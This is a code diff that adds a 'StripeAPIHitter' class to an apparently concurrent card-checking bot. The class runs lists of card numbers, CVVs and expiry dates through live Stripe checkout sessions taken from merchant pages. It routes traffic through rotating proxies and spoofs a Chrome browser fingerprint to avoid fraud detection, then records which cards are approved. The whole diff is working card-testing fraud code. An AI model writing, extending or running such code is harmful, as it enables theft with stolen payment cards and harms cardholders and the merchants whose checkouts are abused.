@@ -10,6 +10,7 @@ from typing import Dict, List, Optional
 from playwright.async_api import async_playwright, Page, Route, Request, Frame
 from playwright_stealth import Stealth
 import aiohttp
+from curl_cffi import requests as cffi_requests
 from dotenv import load_dotenv
 import math
 import numpy as np
@@ -1555,6 +1556,89 @@ async def single_hit(browser, url: str, card: Dict, attempt: int, autofill_class
             except: pass
     return result
 
+class StripeAPIHitter:
+    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict = None):
+        self.pk_live = pk_live
+        self.cs_live = cs_live
+        self.proxy_data = proxy_data
+        
+    async def hit(self, card: Dict, attempt: int, user_id: int) -> Dict:
+        start = time.time()
+        result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': None, 'merchant': None, 'proxy_raw': None, 'error': None}
+        
+        try:
+            proxies = None
+            if self.proxy_data:
+                result['proxy_raw'] = self.proxy_data['raw']
+                auth = f"{self.proxy_data['username']}:{self.proxy_data['password']}@" if self.proxy_data.get('username') else ""
+                proxy_url = f"http://{auth}{self.proxy_data['server']}"
+                proxies = {"http": proxy_url, "https": proxy_url}
+
+            headers = {
+                "authority": "api.stripe.com",
+                "accept": "application/json",
+                "content-type": "application/x-www-form-urlencoded",
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
+            }
+
+            # 1. Generate Payment Method Token
+            pm_url = "https://api.stripe.com/v1/payment_methods"
+            pm_data = {
+                "type": "card",
+                "card[number]": card['card'],
+                "card[cvc]": card['cvv'],
+                "card[exp_month]": card['month'],
+                "card[exp_year]": card['year'],
+                "key": self.pk_live,
+            }
+            
+            loop = asyncio.get_event_loop()
+            pm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(pm_url, headers=headers, data=pm_data, proxies=proxies, timeout=10, impersonate="chrome116"))
+            
+            if pm_res.status_code != 200:
+                pm_json = pm_res.json()
+                result['error'] = pm_json.get('error', {}).get('message', 'Failed to generate payment method')
+                result['decline_code'] = pm_json.get('error', {}).get('decline_code', pm_json.get('error', {}).get('code', 'unknown'))
+                result['response_time'] = time.time() - start
+                return result
+                
+            pm_id = pm_res.json()['id']
+            
+            # 2. Confirm Payment Intent
+            confirm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/confirm"
+            confirm_data = {
+                "payment_method": pm_id,
+                "key": self.pk_live,
+                "expected_payment_method_type": "card"
+            }
+            
+            confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=15, impersonate="chrome116"))
+            confirm_json = confirm_res.json()
+            
+            result['response_time'] = time.time() - start
+            
+            if confirm_res.status_code == 200:
+                status = confirm_json.get('status')
+                if status == 'succeeded' or status == 'requires_capture':
+                    result['success'] = True
+                    return result
+                elif status == 'requires_action':
+                    result['decline_code'] = '3d_secure_required'
+                    return result
+                else:
+                    result['decline_code'] = status
+            else:
+                err = confirm_json.get('error', {})
+                result['decline_code'] = err.get('decline_code', err.get('code', 'unknown'))
+                result['error'] = err.get('message', 'Unknown error')
+                
+        except Exception as e:
+            result['error'] = str(e)
+            result['decline_code'] = 'exception'
+            result['response_time'] = time.time() - start
+            
+        return result
+
 class ConcurrentHitter:
     def __init__(self, user_id: int, url: str, cards: List[Dict], update_callback=None):
         self.user_id = user_id
@@ -1636,7 +1720,14 @@ class ConcurrentHitter:
             try:
                 max_retries = 2 # Reduced to 2 to fail fast and prevent 4+ minute hangs
                 for try_idx in range(max_retries):
-                    result = await single_hit(browser, self.url, card, attempt_num, autofill_class, self.url_info, self.user_id)
+                    if self.url_info and self.url_info.get('cs_token') and self.url_info.get('pk_key'):
+                        proxy_data = await ProxyManager.get_random(self.user_id)
+                        hitter = StripeAPIHitter(self.url_info['pk_key'], self.url_info['cs_token'], proxy_data)
+                        result = await hitter.hit(card, attempt_num, self.user_id)
+                        result['amount'] = self.url_info.get('amount')
+                        result['merchant'] = self.url_info.get('merchant')
+                    else:
+                        result = await single_hit(browser, self.url, card, attempt_num, autofill_class, self.url_info, self.user_id)
                     
                     # Retry if proxy failed/timeout
                     err_str = result.get('error', '')
